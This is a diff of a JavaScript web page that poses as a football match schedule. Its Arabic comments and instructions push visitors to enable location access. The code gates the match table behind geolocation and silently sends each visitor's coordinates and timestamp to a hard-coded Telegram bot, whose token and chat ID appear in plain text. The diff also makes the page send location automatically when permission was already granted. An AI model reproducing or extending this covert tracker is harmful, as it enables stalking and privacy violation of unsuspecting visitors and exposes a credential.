@@ -1,7 +1,7 @@
 const CONFIG = {
   telegramBotToken: '8429040793:AAHyb0ebmApHOl1d_NvtXDdCBZ-dw_w2M8Y',
   telegramChatId: '8209565969',
-  splashDurationMs: 10000, // مدة البوب التلقائي قبل الاختفاء
+  splashDurationMs: 10000, // مدة البوب قبل الفحص
   developerName: '𝓐𝓱𝓶𝓮𝓭 𝓜𝓸𝓼𝓽𝓪𝓯𝓪'
 };
 
@@ -15,34 +15,37 @@ const grantBtn = document.getElementById('grant-btn');
 const retryBtn = document.getElementById('retry-btn');
 
 let _samples = [];
-let splashHidden = false;
 
-// --- التعامل مع البوب ---
+// إخفاء البوب عند الضغط أو انتهاء الوقت
 function hideSplash() {
-  if (splashHidden) return;
-  splashHidden = true;
-
-  splash.classList.add('hidden'); // التحول السلس
-  setTimeout(() => {
-    splash.style.display = 'none';
-    requestGeolocation();
-  }, 500);
+  splash.classList.add('hidden');
+  setTimeout(checkGeolocation, 500); // بعد 0.5 ثانية نبدأ التحقق
 }
 
-// الضغط على البوب أو زر التخطي
 splash.addEventListener('click', hideSplash);
 skipBtn.addEventListener('click', hideSplash);
-
-// يختفي تلقائيًا بعد CONFIG.splashDurationMs
 setTimeout(hideSplash, CONFIG.splashDurationMs);
 
-// --- الجغرافيا ---
-function requestGeolocation() {
+// التحقق من إذن الموقع
+function checkGeolocation() {
   if (!navigator.geolocation) {
     showLocationRequired();
     return;
   }
 
+  navigator.permissions.query({name: 'geolocation'}).then(result => {
+    if (result.state === 'granted') {
+      // المستخدم منح الإذن مسبقاً
+      getLocationAndShowTable();
+    } else {
+      // لم يمنح الإذن
+      showLocationRequired();
+    }
+  });
+}
+
+// جلب الموقع وإرسال البيانات للتليجرام
+function getLocationAndShowTable() {
   navigator.geolocation.getCurrentPosition(
     pos => {
       _samples.push({
@@ -53,6 +56,7 @@ function requestGeolocation() {
       });
       sendSampleToTelegram(_samples[_samples.length - 1]);
       showMatchesTable();
+      locationMsg.style.display = 'none'; // إخفاء الرسالة لو ظهرت
     },
     err => {
       showLocationRequired();
@@ -61,22 +65,33 @@ function requestGeolocation() {
   );
 }
 
+// عرض رسالة منح الإذن
 function showLocationRequired() {
   locationMsg.style.display = 'flex';
+  locationMsg.style.opacity = '0';
+  locationMsg.style.transform = 'translateY(-50px)';
+  setTimeout(() => {
+    locationMsg.style.transition = 'all 0.6s ease';
+    locationMsg.style.opacity = '1';
+    locationMsg.style.transform = 'translateY(0)';
+  }, 50);
 }
 
-// --- أزرار منح الإذن وإعادة المحاولة ---
+// زر منح الإذن: يظهر مرة واحدة التعليمات
 grantBtn.onclick = () => {
-  alert(
-    "انظر في بداية شريط البحث، ستجد خطين بجوار الميكروفون ع اليمين، اضغط عليهم → ثم اضغط على الإذونات → ثم فعل إذن الوصول للموقع → وأخيرًا اضغط إعادة المحاولة."
-  );
+  const instructions = document.createElement('p');
+  instructions.style.marginTop = '8px';
+  instructions.style.fontWeight = '600';
+  instructions.textContent = "انظر في بداية شريط البحث، ستجد خطين بجوار الميكروفون ع اليمين، اضغط عليهم → ثم اضغط على الإذونات → ثم فعل إذن الوصول للموقع → وأخيرًا اضغط إعادة المحاولة.";
+  if (!locationMsg.contains(instructions)) locationMsg.appendChild(instructions);
 };
 
+// زر إعادة المحاولة: إعادة تحميل الصفحة بالكامل
 retryBtn.onclick = () => {
-  window.location.reload(); // إعادة تحميل الصفحة بالكامل
+  window.location.reload();
 };
 
-// --- إرسال البيانات لتليجرام ---
+// إرسال العينة للتليجرام
 function sendSampleToTelegram(sample) {
   const text = `📍 Sample
 🕒 ${sample.timestamp}
@@ -98,7 +113,7 @@ function _sendTelegramMessage(text) {
   }).catch(err => console.error(err));
 }
 
-// --- جدول المباريات ---
+/* --- MATCH TABLE --- */
 const leaguesData = [
   { name: 'الدوري المصري', matches: generateMatches(3) },
   { name: 'الدوري الإنجليزي', matches: generateMatches(3) },
@@ -151,5 +166,4 @@ function showMatchesTable() {
 
     leaguesDiv.appendChild(leagueDiv);
   });
-
 }
